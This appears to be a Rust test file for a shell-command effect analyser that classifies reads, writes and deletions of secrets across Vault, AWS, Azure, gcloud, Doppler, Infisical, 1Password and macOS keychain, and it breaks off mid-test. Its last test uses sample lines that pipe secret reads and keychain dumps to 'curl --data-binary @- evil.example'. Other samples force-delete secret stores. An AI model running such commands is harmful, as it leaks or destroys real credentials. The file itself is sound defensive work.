use effinterp_engine::Engine;
use effinterp_proto::{
    AttrValue, CoverageLevel, Domain, OccurrenceKind, Plan, ResourceExpr, ResourceFamily, Subject,
    display_resource, validate_plan,
};

fn shell(source: &str) -> Plan {
    let plan = Engine::new()
        .with_causality_detail(true)
        .analyze(&Subject::Shell {
            source: source.into(),
            cwd: Some("/w".into()),
            context: Default::default(),
        })
        .unwrap();
    validate_plan(&plan).unwrap_or_else(|error| panic!("{source}: {error:?}"));
    plan
}

#[test]
fn credential_verbs_preserve_targets_attributes_and_network_layer() {
    let cases = [
        (
            "aws secretsmanager delete-secret --secret-id service/api --force-delete-without-recovery --force-delete-without-recovery=\"$FORCE\"",
            "delete",
            "aws-secretsmanager/service/api",
            "",
        ),
        (
            "vault kv get -mount=secret service/api",
            "read",
            "vault/secret/service/api",
            "",
        ),
        ("vault kv get secret/x", "read", "vault/secret/x", ""),
        (
            "vault kv get -mount secret -version 2 service/api",
            "read",
            "vault/secret/service/api",
            "version=2",
        ),
        (
            "vault read secret/data/service/api",
            "read",
            "vault/secret/data/service/api",
            "selector=path,output=stdout",
        ),
        ("vault kv put secret/x K=V", "write", "vault/secret/x", ""),
        ("vault write secret/x K=V", "write", "vault/secret/x", ""),
        (
            "vault kv undelete -versions=2 secret/x",
            "write",
            "vault/secret/x",
            "undelete,version=2",
        ),
        (
            "vault kv delete -mount=secret service/api",
            "delete",
            "vault/secret/service/api",
            "deletion=recoverable",
        ),
        (
            "vault kv delete -versions 2 secret/x",
            "delete",
            "vault/secret/x",
            "version=2,deletion=recoverable",
        ),
        ("vault delete secret/x", "delete", "vault/secret/x", ""),
        (
            "vault kv destroy -mount=secret -versions=2 service/api",
            "delete",
            "vault/secret/service/api",
            "destroy,version=2",
        ),
        (
            "vault kv metadata delete secret/api",
            "delete",
            "vault/secret/api",
            "destroy",
        ),
        (
            "vault secrets disable secret/",
            "delete",
            "vault/secret",
            "destroy",
        ),
        (
            "aws secretsmanager get-secret-value --secret-id service/api --version-id 2",
            "read",
            "aws-secretsmanager/service/api",
            "version=2",
        ),
        (
            "aws secretsmanager get-secret-value --secret-id=service/api --version-stage=AWSCURRENT",
            "read",
            "aws-secretsmanager/service/api",
            "version=AWSCURRENT",
        ),
        (
            "aws secretsmanager put-secret-value --secret-id service/api --secret-string x",
            "write",
            "aws-secretsmanager/service/api",
            "",
        ),
        (
            "aws secretsmanager create-secret --name service/api --secret-string x",
            "write",
            "aws-secretsmanager/service/api",
            "",
        ),
        (
            "aws secretsmanager restore-secret --secret-id service/api",
            "write",
            "aws-secretsmanager/service/api",
            "restore",
        ),
        (
            "aws secretsmanager delete-secret --secret-id service/api --recovery-window-in-days 14",
            "delete",
            "aws-secretsmanager/service/api",
            "recovery_window=14,deletion=recoverable",
        ),
        (
            "aws secretsmanager delete-secret --secret-id service/api --force-delete-without-recovery",
            "delete",
            "aws-secretsmanager/service/api",
            "destroy",
        ),
        (
            "aws secretsmanager delete-secret --secret-id service/api --force-delete-without-recovery=true",
            "delete",
            "aws-secretsmanager/service/api",
            "destroy",
        ),
        (
            "aws secretsmanager delete-secret --secret-id service/api --force-delete-without-recovery=false",
            "delete",
            "aws-secretsmanager/service/api",
            "deletion=recoverable",
        ),
        (
            "aws secretsmanager delete-secret --secret-id service/api --force-delete-without-recovery --no-force-delete-without-recovery",
            "delete",
            "aws-secretsmanager/service/api",
            "deletion=recoverable",
        ),
        (
            "aws secretsmanager delete-secret --secret-id service/api --no-force-delete-without-recovery --force-delete-without-recovery",
            "delete",
            "aws-secretsmanager/service/api",
            "destroy",
        ),
        (
            "aws ssm get-parameter --name /service/api --with-decryption",
            "read",
            "aws-ssm//service/api",
            "",
        ),
        (
            "aws ssm get-parameters --names /api /db",
            "read",
            "aws-ssm//api,aws-ssm//db",
            "",
        ),
        (
            "aws ssm put-parameter --name /api --value x --type SecureString",
            "write",
            "aws-ssm//api",
            "",
        ),
        (
            "aws ssm delete-parameter --name /api",
            "delete",
            "aws-ssm//api",
            "destroy",
        ),
        (
            "aws ssm delete-parameters --names /api /db",
            "delete",
            "aws-ssm//api,aws-ssm//db",
            "destroy",
        ),
        (
            "az keyvault secret show --vault-name prod --name service-api",
            "read",
            "azure-keyvault/prod/service-api",
            "",
        ),
        (
            "az keyvault secret set --vault-name=prod --name=service-api --value=x",
            "write",
            "azure-keyvault/prod/service-api",
            "",
        ),
        (
            "az keyvault secret delete --vault-name prod --name service-api",
            "delete",
            "azure-keyvault/prod/service-api",
            "deletion=recoverable",
        ),
        (
            "az keyvault secret purge --vault-name prod --name service-api",
            "delete",
            "azure-keyvault/prod/service-api",
            "destroy",
        ),
        (
            "az keyvault purge --name prod",
            "delete",
            "azure-keyvault/prod",
            "destroy",
        ),
        (
            "gcloud secrets versions access latest --secret=service-api",
            "read",
            "gcloud/service-api",
            "version=latest",
        ),
        (
            "gcloud secrets versions add --secret service-api",
            "write",
            "gcloud/service-api",
            "",
        ),
        (
            "gcloud secrets create service-api",
            "write",
            "gcloud/service-api",
            "",
        ),
        (
            "gcloud secrets versions destroy 7 --secret=service-api --quiet",
            "delete",
            "gcloud/service-api",
            "version=7,deletion=remote_policy",
        ),
        (
            "gcloud secrets delete api",
            "delete",
            "gcloud/api",
            "destroy",
        ),
        (
            "doppler secrets get API_TOKEN --plain --project service --config prod",
            "read",
            "doppler/service/prod/API_TOKEN",
            "selector=secret_name,output=stdout,format=plain",
        ),
        (
            "doppler secrets download --project service --config prod",
            "read",
            "doppler/service/prod",
            "selector=store,output=file",
        ),
        (
            "doppler secrets get --config prod",
            "read",
            "doppler/prod",
            "selector=store,output=stdout",
        ),
        (
            "doppler secrets set K=V --project service --config prod",
            "write",
            "doppler/service/prod/K",
            "",
        ),
        (
            "doppler secrets set K=\"$VALUE\" --project service",
            "write",
            "doppler/service/K",
            "",
        ),
        (
            "doppler secrets delete K L --project service --config prod",
            "delete",
            "doppler/service/prod/K,doppler/service/prod/L",
            "deletion=recoverable",
        ),
        (
            "doppler projects delete service",
            "delete",
            "doppler/service",
            "destroy",
        ),
        (
            "doppler configs delete prod --project service",
            "delete",
            "doppler/service/prod",
            "destroy",
        ),
        (
            "infisical secrets get K --projectId project --env prod",
            "read",
            "infisical/project/prod/K",
            "selector=secret_name,output=stdout",
        ),
        (
            "infisical secrets set K=V --projectId project --env prod",
            "write",
            "infisical/project/prod/K",
            "",
        ),
        (
            "infisical secrets delete K --projectId project --env prod",
            "delete",
            "infisical/project/prod/K",
            "deletion=recoverable",
        ),
        (
            "infisical export --projectId project --env prod --format=json",
            "read",
            "infisical/project/prod",
            "selector=store,output=stdout,format=json",
        ),
        (
            "infisical secrets folders delete --projectId project --env prod --path / --name service",
            "delete",
            "infisical/project/prod/service",
            "deletion=recoverable",
        ),
        (
            "op read op://prod/service/password",
            "read",
            "1password/prod/service/password",
            "selector=path,output=stdout",
        ),
        (
            "op item get item --vault prod",
            "read",
            "1password/prod/item",
            "selector=item,output=stdout",
        ),
        // Regression: archiving was planned as a recoverable deletion, so
        // secrets-store-delete blocked a move the guard documents as passing.
        (
            "op item delete item --vault prod --archive",
            "write",
            "1password/prod/item",
            "archive",
        ),
        (
            "op item delete item --vault prod --archive=True",
            "write",
            "1password/prod/item",
            "archive",
        ),
        (
            "infisical export --projectId project --env prod --format=json --output-file=result.json",
            "read",
            "infisical/project/prod",
            "selector=store,output=file,format=json,output_path=result.json",
        ),
        (
            "op read op://prod/service/password --out-file result",
            "read",
            "1password/prod/service/password",
            "selector=path,output=file",
        ),
        (
            "vault read -field=value secret/api > result",
            "read",
            "vault/secret/api",
            "selector=path,output=stdout,field=value",
        ),
        (
            "doppler secrets get K --json --project service --config prod",
            "read",
            "doppler/service/prod/K",
            "selector=secret_name,output=stdout,format=json",
        ),
        (
            "doppler secrets download result --project service --config prod",
            "read",
            "doppler/service/prod",
            "selector=store,output=file",
        ),
        (
            "doppler secrets download --no-file --format env --project service --config prod",
            "read",
            "doppler/service/prod",
            "selector=store,output=stdout,format=env",
        ),
        (
            "op item get item",
            "read",
            "1password/item",
            "selector=item,output=stdout",
        ),
        (
            "op item delete item --vault prod",
            "delete",
            "1password/prod/item",
            "deletion=recoverable",
        ),
        (
            "op vault delete vault-id",
            "delete",
            "1password/vault-id",
            "destroy",
        ),
    ];
    for (source, verb, resources, attrs) in cases {
        let plan = shell(source);
        let effects: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| {
                e.operation.domain() == "credential" && !e.operation.as_str().ends_with("_request")
            })
            .collect();
        let mut actual: Vec<_> = effects
            .iter()
            .map(|e| display_resource(&e.resource))
            .collect();
        let mut expected: Vec<_> = resources.split(',').map(|s| format!("cred:{s}")).collect();
        actual.sort();
        expected.sort();
        assert_eq!(actual, expected, "{source}");
        let expected_attrs: std::collections::BTreeMap<String, AttrValue> = attrs
            .split(',')
            .filter(|a| !a.is_empty())
            .map(|a| {
                a.split_once('=')
                    .map_or((a.to_string(), AttrValue::Bool(true)), |(k, v)| {
                        (k.into(), AttrValue::String(v.into()))
                    })
            })
            .collect();
        let mut expected_attrs = expected_attrs;
        if verb == "read"
            && (source.starts_with("vault read ")
                || source.starts_with("doppler ")
                || source.starts_with("infisical ")
                || source.starts_with("op "))
            || source.starts_with("vault kv get ")
            || source.starts_with("aws secretsmanager get-secret-value ")
            || source.starts_with("gcloud secrets versions access ")
            || source.starts_with("aws ssm get-parameter")
            || source.starts_with("az keyvault secret show ")
        {
            expected_attrs.insert("mode".into(), AttrValue::String("value".into()));
            expected_attrs.insert("workflow".into(), AttrValue::String("ordinary".into()));
            expected_attrs.insert("purpose".into(), AttrValue::String("explicit".into()));
        }
        // Without --with-decryption an SSM read does not prove the value.
        if source.starts_with("aws ssm get-parameter") && !source.contains("--with-decryption") {
            expected_attrs.remove("mode");
        }
        if source.starts_with("vault kv metadata delete ") {
            expected_attrs.insert("mode".into(), AttrValue::String("metadata".into()));
        }
        if expected_attrs.contains_key("destroy") {
            expected_attrs.insert("deletion".into(), AttrValue::String("permanent".into()));
        }
        for request in plan
            .effects
            .iter()
            .filter(|effect| effect.operation.as_str().ends_with("_request"))
        {
            assert_eq!(request.attributes, expected_attrs, "{source}");
        }
        for effect in effects {
            assert_eq!(
                effect.operation.as_str(),
                format!("credential.{verb}"),
                "{source}"
            );
            assert_eq!(effect.attributes, expected_attrs, "{source}");
        }
        let network: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.as_str() == "network.request")
            .collect();
        assert_eq!(network.len(), 1, "{source}");
        assert_eq!(
            network[0].resource,
            ResourceExpr::Unresolved {
                family: ResourceFamily::new("network")
            }
        );
        for domain in ["credential", "network", "process"] {
            assert!(
                plan.coverage.is_full(&Domain::new(domain)),
                "{source}: {domain}"
            );
        }
        if !source.starts_with("aws ")
            && !source.starts_with("az ")
            && !source.starts_with("gcloud ")
        {
            assert!(
                plan.coverage.is_full(&Domain::new("filesystem")),
                "{source}"
            );
            assert!(
                plan.boundaries.is_empty(),
                "{source}: {:?}",
                plan.boundaries
            );
        }
    }
}

#[test]
fn audited_credential_requests_reject_unknown_controls_and_missing_targets() {
    for source in [
        "security dump-keychain -i",
        "HOME=/home/test security dump-keychain ''",
        "security dump-keychain -o",
        "security dump-keychain --unknown /keys",
        "security dump-keychain \"$OPTIONS\"",
        "security dump-keychain /keys -d",
        "security find-generic-password -s api",
        "security find-internet-password -s example.com -a me",
        "security find-generic-password -w -s",
        "security find-generic-password -w -z api",
        "security find-generic-password -w -r htps -s api",
        "security -i find-generic-password -w -s api",
        "security -l find-generic-password -w -s api",
        "security -p prompt find-generic-password -w -s api",
        // Empty, the attached value would take `-w` as the service instead.
        "security find-generic-password -s\"$SERVICE\" -w",
        "security find-generic-password login.keychain -w",
    ] {
        let plan = shell(source);
        assert!(
            plan.effects
                .iter()
                .all(|e| e.operation.domain() != "credential"),
            "{source}"
        );
        assert!(
            !plan.coverage.is_full(&Domain::new("credential")),
            "{source}"
        );
        assert!(!plan.boundaries.is_empty(), "{source}");
    }
    let help = shell("security dump-keychain -h");
    assert!(
        help.effects
            .iter()
            .all(|e| e.operation.domain() != "credential")
    );
    for source in [
        "aws secretsmanager delete-secret --secret-id api --bogus",
        "aws secretsmanager delete-secret --secret-id file:///tmp/secret-id",
        "aws secretsmanager get-secret-value --secret-id fileb:///tmp/secret-id",
        "aws secretsmanager get-secret-value --secret-id api --version-stage file:///tmp/stage",
        "aws secretsmanager delete-secret --bogus",
        "aws secretsmanager delete-secret --secret-id api --force-delete-without-recovery=false",
        "aws secretsmanager delete-secret --secret-id --help",
        "aws secretsmanager delete-secret api extra --secret-id api",
        "vault kv get --help secret/api",
        "vault kv get -versions=1 secret/api",
        "vault kv delete -version=1 secret/api",
        "vault kv metadata delete -format=json secret/api",
        "vault kv destroy secret/api",
        "vault kv destroy -versions=not-a-version secret/api",
        "vault kv get secret/api -format=json",
        "vault kv get secret/api -field secret/api",
        "vault kv get -version=wrong -version=1 secret/api",
        "vault kv get -format=raw secret/api",
        "aws secretsmanager delete-secret --secret-id api --recovery-window-in-days 0",
        "aws secretsmanager delete-secret --secret-id api --recovery-window-in-days 31",
        "aws secretsmanager delete-secret --secret-id api --recovery-window-in-days seven",
        "aws secretsmanager delete-secret --secret-id api --recovery-window-in-days 7 --force-delete-without-recovery",
        "op item get item extra",
        "aws ssm get-parameter --name /api --generate-cli-skeleton",
        "aws ssm get-parameter --name /api --with-decryption=false",
        "aws ssm get-parameter --name /api --with-decryption --no-with-decryption",
        "aws ssm get-parameter --name /api --query Parameter.Name",
        "aws ssm get-parameter --name /api --with-decryption --query Parameter.Name",
        "aws secretsmanager get-secret-value --secret-id api --query Name",
        // One requested name returns at most one parameter, so index 1 is null.
        "aws ssm get-parameters --names /api --with-decryption --query 'Parameters[1].Value'",
        "aws ssm delete-parameter --name /api --help",
        "aws ssm delete-parameter --name file:///tmp/names",
        "aws ssm delete-parameters extra --names /api",
        "aws ssm delete-parameters --names /api --region us-east-1 /db",
        "aws ssm delete-parameters --names /api --names /db",
        "aws ssm delete-parameters --names '[/api,/db]'",
        "az keyvault secret show --vault-name prod --name service-api --query id",
        "az keyvault secret show --vault-name prod --name service-api --output none",
        "az keyvault secret show --vault-name prod --name service-api -o garbage",
        "aws secretsmanager get-secret-value --secret-id api --output garbage",
        "aws ssm get-parameter --name /api --with-decryption --output garbage",
        "az keyvault secret purge --name service-api",
        "az keyvault secret purge extra --vault-name prod --name service-api",
        "az keyvault purge --name prod --help",
        "gcloud secrets delete api --help",
        "gcloud secrets delete api extra",
        "gcloud secrets delete ''",
        "gcloud secrets delete api --quiet=false",
        "gcloud secrets versions access latest --secret=api --format=none",
        "gcloud secrets versions access latest --secret=api --flags-file=/tmp/flags",
        "gcloud secrets versions access latest --secret=api --out-file=/tmp/value",
        "gcloud secrets versions destroy latest --secret=api",
        "vault read -mount=secret api",
        "vault read secret/api -bogus",
        "vault secrets disable secret/ extra",
        "doppler secrets delete K --project service --config prod --bogus",
        "doppler configs delete prod",
        "infisical export --env prod",
        "infisical secrets folders delete --projectId project --env prod --path /",
        "op read op://prod",
        "op item delete item --vault prod --archive --archive",
        "op item delete item --vault prod --archive=maybe",
        "op vault delete prod --archive",
        "doppler secrets get K --project service --config prod --no-file",
        "infisical secrets get K --projectId project --env prod --output-file=result",
        "op read op://prod/item/password --out-file=\"$FILE\"",
        "op read op://prod/item/password --out-file one --out-file two",
    ] {
        let plan = shell(source);
        assert!(
            !plan.effects.iter().any(|effect| {
                matches!(
                    effect.operation.as_str(),
                    "credential.read_request" | "credential.delete_request"
                )
            }),
            "{source} must not be exact"
        );
        if source.starts_with("aws ") || source.starts_with("az ") || source.starts_with("gcloud ")
        {
            assert_eq!(
                plan.coverage.level(&Domain::new("cloud")),
                Some(CoverageLevel::Partial),
                "{source}"
            );
        }
    }
    for source in [
        "aws secretsmanager delete-secret --secret-id api --recovery-window-in-days 7",
        "aws secretsmanager delete-secret --secret-id api --recovery-window-in-days 30",
        "aws secretsmanager delete-secret --secret-id api --force-delete-without-recovery",
        "vault kv get -version=1 -format=json -mount=secret api",
        "vault kv delete -field=value secret/api",
        "vault kv destroy -versions=1,2 secret/api",
        "vault kv metadata delete -mount=secret api",
        "aws ssm get-parameter --name /api --with-decryption",
        "aws --region us-east-1 ssm get-parameter --name /api --with-decryption",
        "aws --profile production secretsmanager delete-secret --secret-id api",
        "gcloud --project example-project secrets delete api --quiet",
        "aws ssm get-parameters --names /api /db --region us-east-1",
        "aws ssm delete-parameter --name /api",
        "aws ssm delete-parameters --names=/api /db",
        "aws ssm delete-parameters --names /api --query DeletedParameters",
        "az keyvault secret show --vault-name prod --name service-api",
        "az keyvault secret show --vault-name prod --name service-api --query value -o tsv",
        "aws secretsmanager get-secret-value --secret-id api --query SecretString --output text",
        "aws ssm get-parameter --name /api --with-decryption --query Parameter.Value --output text",
        "aws ssm get-parameters --names /api /db --with-decryption --query 'Parameters[1].Value'",
        "az keyvault secret show --vault-name prod --name service-api -o yamlc",
        "aws secretsmanager get-secret-value --secret-id api --output yaml-stream",
        "gcloud secrets versions access latest --secret=api --format=json",
        "az keyvault secret purge --vault-name prod --name service-api",
        "az keyvault purge --name prod",
        "gcloud secrets versions access latest --secret=api",
        "gcloud secrets versions destroy 7 --secret=api --quiet",
        "gcloud secrets delete api --project example-project --quiet",
        "vault read secret/data/service/api",
        "vault read -field=value secret/api",
        "vault secrets disable secret/",
        "doppler secrets get API_TOKEN --plain --project service --config prod",
        "doppler secrets download --project service --config prod",
        "doppler secrets delete K L --project service --config prod",
        "doppler projects delete service",
        "doppler configs delete prod --project service",
        "infisical export --projectId project --env prod --format=json",
        "infisical secrets get K --projectId project --env prod",
        "infisical secrets folders delete --projectId project --env prod --path / --name service",
        "op read op://prod/service/password",
        "op item get item --vault prod",
        "op item delete item --vault prod",
        // Regression: an explicit `--archive=false` is an ordinary delete,
        // but the attached boolean left its request uncertified.
        "op item delete item --vault prod --archive=false",
        "op document delete doc --vault prod --archive=0",
        "op read op://prod/item/password --out-file result",
        "infisical export --projectId project --env prod --output-file=result.json",
        "op vault delete vault-id",
        // Vault's -versions is a string slice: each occurrence adds versions.
        "vault kv destroy -versions=1 -versions=2 secret/api",
        // A store the local configuration or account resolves is still an
        // exact request; the target names only what the invocation gives.
        "doppler secrets get API_TOKEN --project service",
        "doppler secrets get API_TOKEN --config prod",
        "op item get item",
        "infisical secrets get K --projectId project --env prod --path /app",
    ] {
        let plan = shell(source);
        if source.starts_with("aws ") || source.starts_with("az ") || source.starts_with("gcloud ")
        {
            for domain in ["cloud", "credential", "network", "process"] {
                assert!(
                    plan.coverage.is_full(&Domain::new(domain)),
                    "{source}: {domain}"
                );
            }
            assert!(
                plan.boundaries.is_empty(),
                "{source}: {:?}",
                plan.boundaries
            );
        }
        let request = plan
            .effects
            .iter()
            .find(|effect| {
                matches!(
                    effect.operation.as_str(),
                    "credential.read_request" | "credential.delete_request"
                )
            })
            .unwrap_or_else(|| panic!("{source} must retain its request"));
        assert_eq!(
            request.request_assurance,
            effinterp_proto::RequestAssurance::Exact,
            "{source}"
        );
        assert_eq!(
            request.modality,
            effinterp_proto::Modality::MustOnSuccess,
            "{source}"
        );
        assert!(
            plan.effects
                .iter()
                .filter(|effect| matches!(
                    effect.operation.as_str(),
                    "credential.read" | "credential.delete"
                ))
                .all(|effect| effect.modality == effinterp_proto::Modality::May),
            "{source}"
        );
    }
    // Regression: the query recognizer recursed once per nested multiselect,
    // so a deep query overflowed the stack instead of staying inexact.
    for (depth, exact) in [(32, true), (33, false), (32_768, false)] {
        let plan = shell(&format!(
            "az keyvault secret show --vault-name prod --name api --query '{}value{}'",
            "[".repeat(depth),
            "]".repeat(depth)
        ));
        assert_eq!(
            plan.effects
                .iter()
                .any(|effect| effect.operation.as_str() == "credential.read_request"),
            exact,
            "{depth}"
        );
        assert_eq!(
            plan.coverage.is_full(&Domain::new("cloud")),
            exact,
            "{depth}"
        );
    }
    let mixed = shell(
        "aws ssm get-parameter --name /api; aws cloudformation delete-stack --stack-name dev",
    );
    assert_eq!(
        mixed.coverage.level(&Domain::new("cloud")),
        Some(CoverageLevel::Partial)
    );
    assert!(
        mixed
            .effects
            .iter()
            .any(|e| e.operation.as_str() == "credential.read_request")
    );
}

#[test]
fn missing_and_symbolic_names_keep_credential_effects_and_unknown_verbs_bound_coverage() {
    for (source, mode) in [
        ("security dump-keychain", "metadata"),
        ("security dump-keychain -ad", "value"),
        ("security dump-keychain -r", "metadata"),
        ("security find-generic-password -w -s api", "value"),
        ("security find-internet-password -gw -s \"$HOST\"", "value"),
        ("security -q find-generic-password -w -s api", "value"),
        ("security -qv -- find-internet-password -w -s api", "value"),
        ("security -q dump-keychain", "metadata"),
    ] {
        let plan = shell(source);
        assert!(
            plan.effects
                .iter()
                .all(|e| e.operation.domain() != "filesystem"),
            "{source}"
        );
        assert!(
            !plan.coverage.is_full(&Domain::new("filesystem")),
            "{source}"
        );
        assert!(
            plan.coverage.is_full(&Domain::new("credential")),
            "{source}"
        );
        assert_eq!(plan.boundaries.len(), 1, "{source}");
        let boundary = &plan.boundaries[0];
        assert_eq!(boundary.class, effinterp_proto::BoundaryClass::Unresolved);
        assert_eq!(
            boundary.reason,
            effinterp_proto::BoundaryReason::PARTIAL_ANALYSIS
        );
        assert_eq!(boundary.domains, vec![Domain::new("filesystem")]);
        let credentials: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.domain() == "credential")
            .collect();
        assert_eq!(credentials.len(), 2, "{source}");
        for effect in credentials {
            assert_eq!(
                effect.resource,
                ResourceExpr::Concrete {
                    identity: effinterp_proto::ResourceIdentity::CredentialStore {
                        provider: "macos-keychain".into(),
                        store: Some("search-list".into()),
                        path: None,
                    },
                },
                "{source}"
            );
            assert_eq!(
                effect.attributes.get("mode"),
                Some(&AttrValue::String(mode.into()))
            );
            assert_eq!(
                effect.attributes.get("output"),
                Some(&AttrValue::String("stdout".into()))
            );
            if effect.operation.as_str() == "credential.read_request" {
                assert_eq!(
                    effect.request_assurance,
                    effinterp_proto::RequestAssurance::Exact
                );
                assert_eq!(effect.modality, effinterp_proto::Modality::MustOnSuccess);
            }
        }
        assert!(
            plan.effects
                .iter()
                .all(|e| e.operation.domain() != "network")
        );
    }
    // A value lookup names its item by the literal attributes it selects on.
    for (source, attributes) in [
        (
            "security find-generic-password -s api -a me -l Login -w",
            vec![
                ("selector", "item"),
                ("service", "api"),
                ("account", "me"),
                ("label", "Login"),
                ("output", "stdout"),
            ],
        ),
        (
            "security find-internet-password -g -s example.com",
            vec![("server", "example.com"), ("output", "stderr")],
        ),
        (
            "security -v find-internet-password -g -s example.com -r htps",
            vec![("server", "example.com"), ("output", "stderr")],
        ),
    ] {
        let plan = shell(source);
        let request = plan
            .effects
            .iter()
            .find(|e| e.operation.as_str() == "credential.read_request")
            .unwrap_or_else(|| panic!("{source}"));
        for (name, value) in attributes {
            assert_eq!(
                request.attributes.get(name),
                Some(&AttrValue::String(value.into())),
                "{source}: {name}"
            );
        }
    }
    // A symbolic selector keeps the value read, with the service unknown,
    // whether its value is attached to the flag or a word of its own.
    for source in [
        "security find-generic-password -w -s \"$SERVICE\"",
        "security find-generic-password -w -s\"$SERVICE\"",
        "security find-generic-password -s-$SERVICE -w",
        "security find-generic-password -ws\"$SERVICE\"",
    ] {
        let plan = shell(source);
        let request = plan
            .effects
            .iter()
            .find(|e| e.operation.as_str() == "credential.read_request")
            .unwrap_or_else(|| panic!("{source}"));
        assert_eq!(
            request.attributes.get("mode"),
            Some(&AttrValue::String("value".into())),
            "{source}"
        );
        assert_eq!(request.attributes.get("service"), None, "{source}");
    }
    for source in [
        "security dump-keychain login.keychain",
        "security dump-keychain -- -d",
    ] {
        let plan = shell(source);
        assert!(
            plan.effects
                .iter()
                .all(|e| !matches!(e.operation.domain(), "credential" | "filesystem")),
            "{source}"
        );
        assert!(
            !plan.coverage.is_full(&Domain::new("credential")),
            "{source}"
        );
        assert!(
            !plan.coverage.is_full(&Domain::new("filesystem")),
            "{source}"
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.class == effinterp_proto::BoundaryClass::Unresolved),
            "{source}"
        );
    }
    for (source, mode, files) in [
        ("security dump-keychain /keys", "metadata", vec!["fs:/keys"]),
        (
            "security dump-keychain -ad /keys /other",
            "value",
            vec!["fs:/keys", "fs:/other"],
        ),
        (
            "security dump-keychain -r -- /keys",
            "metadata",
            vec!["fs:/keys"],
        ),
        (
            "HOME=/home/test security dump-keychain selected.keychain-db",
            "metadata",
            vec!["fs:/home/test/Library/Keychains/selected.keychain-db"],
        ),
        (
            "HOME=/home/test security dump-keychain -- -d",
            "metadata",
            vec!["fs:/home/test/Library/Keychains/-d"],
        ),
    ] {
        let plan = shell(source);
        assert_eq!(
            plan.effects
                .iter()
                .filter(|e| e.operation.as_str() == "filesystem.read")
                .map(|e| display_resource(&e.resource))
                .collect::<Vec<_>>(),
            files,
            "{source}"
        );
        for effect in plan
            .effects
            .iter()
            .filter(|e| e.operation.domain() == "credential")
        {
            for (name, value) in [
                ("mode", mode),
                ("workflow", "ordinary"),
                ("purpose", "explicit"),
                ("selector", "store"),
                ("output", "stdout"),
            ] {
                assert_eq!(
                    effect.attributes.get(name),
                    Some(&AttrValue::String(value.into())),
                    "{source}: {name}"
                );
            }
        }
        let credential_targets: Vec<_> = plan
            .effects
            .iter()
            .filter(|e| e.operation.as_str() == "credential.read_request")
            .map(|e| match &e.resource {
                ResourceExpr::Concrete {
                    identity:
                        effinterp_proto::ResourceIdentity::CredentialStore {
                            provider,
                            store,
                            path,
                        },
                } => {
                    assert_eq!(provider, "macos-keychain");
                    assert!(path.is_none());
                    format!("fs:{}", store.as_ref().unwrap())
                }
                other => panic!("unexpected keychain target: {other:?}"),
            })
            .collect();
        assert_eq!(credential_targets, files, "{source}");
        assert!(plan.boundaries.is_empty(), "{source}");
        assert!(
            plan.coverage.is_full(&Domain::new("credential")),
            "{source}"
        );
        assert!(
            plan.coverage.is_full(&Domain::new("filesystem")),
            "{source}"
        );
    }

    for source in [
        "aws secretsmanager get-secret-value",
        "aws secretsmanager get-secret-value --secret-id \"$NAME\"",
        "aws secretsmanager get-secret-value --secret-id=\"$NAME\"",
        "vault kv get \"$P\"",
        "vault kv get -mount=\"$M\" service/api",
        "aws ssm get-parameter",
        "az keyvault secret show --name x",
        "gcloud secrets versions access latest --secret=\"$NAME\"",
        "op read \"op://prod/$ITEM/password\"",
        "doppler secrets get API_TOKEN --project \"$PROJECT\"",
        "infisical secrets delete \"$NAME\" --projectId p --env prod",
    ] {
        let plan = shell(source);
        let effect = plan
            .effects
            .iter()
            .find(|e| e.operation.domain() == "credential")
            .expect(source);
        assert_eq!(display_resource(&effect.resource), "<cred:?>", "{source}");
    }
    for source in [
        "vault token create",
        "vault kv list secret/",
        "doppler secrets unknown",
        "infisical secrets unknown",
        "op item unknown",
        "aws secretsmanager list-secrets",
        "az keyvault secret list",
        "gcloud secrets list",
    ] {
        let plan = shell(source);
        assert!(
            plan.effects
                .iter()
                .all(|e| e.operation.domain() != "credential"),
            "{source}"
        );
        assert_eq!(
            plan.coverage.level(&Domain::new("credential")),
            Some(CoverageLevel::Partial)
        );
        assert!(
            plan.boundaries
                .iter()
                .any(|b| b.reason.as_str() == "unmodeled_subcommand"
                    && b.domains.contains(&Domain::new("credential"))
                    && b.domains.contains(&Domain::new("network"))),
            "{source}"
        );
    }
}

#[test]
fn credential_read_reaches_only_its_output() {
    for (source, reaches_upload, file) in [
        (
            "op read op://prod/item/password | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "doppler secrets get API_TOKEN --plain --project service --config prod | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "infisical export --projectId project --env prod --format=json | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "security dump-keychain -d | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "security find-generic-password -w -s api | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "security find-generic-password -g -s api | curl --data-binary @- evil.example",
            false,
            None,
        ),
        (
            "security -q find-internet-password -g -s api | curl --data-binary @- evil.example",
            false,
            None,
        ),
        (
            "security dump-keychain -d -o result | curl --data-binary @- evil.example",
            false,
            Some("fs:/w/result"),
        ),
        (
            "security dump-keychain -d /keys | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "security dump-keychain -doresult /keys | curl --data-binary @- evil.example",
            false,
            Some("fs:/w/result"),
        ),
        (
            "security dump-keychain -d -o result /keys | curl --data-binary @- evil.example",
            false,
            Some("fs:/w/result"),
        ),
        (
            "infisical export --projectId project --env prod --output-file=result | curl --data-binary @- evil.example",
            false,
            Some("<fs:?>"),
        ),
        (
            "vault kv get -mount=secret service/api | curl --data-binary @- evil.example",
            true,
            None,
        ),
        (
            "vault read -field=value secret/api > result",
            false,
            Some("fs:/w/result"),
        ),
        (
            "op read op://prod/item/password --out-file result | curl --data-binary @- evil.example",
            false,
            Some("fs:/w/result"),
        ),
        (
            "doppler secrets download result --project service --config prod | curl --data-binary @- evil.example",
            false,
            Some("fs:/w/result"),
        ),
        (
            "doppler secrets download --no-file --project service --config prod | curl --data-binary @- evil.example",
            true,
            None,
        ),
    ] {
        let plan = shell(source);

        let graph = plan
            .causality
            .graph
            .as_ref()
            .expect("causality detail required");
        let interaction = |operation: &str| {
            graph.nodes.iter().find(|n| matches!(&n.occurrence, OccurrenceKind::ResourceInteraction { operation: op, .. } if op.as_str() == operation)).unwrap().id.clone()
        };
        let mut reachable = std::collections::BTreeSet::from([interaction(
            if source.starts_with("security ")
                && plan
                    .effects
                    .iter()
                    .any(|e| e.operation.as_str() == "filesystem.read")
            {
                "filesystem.read"
            } else {
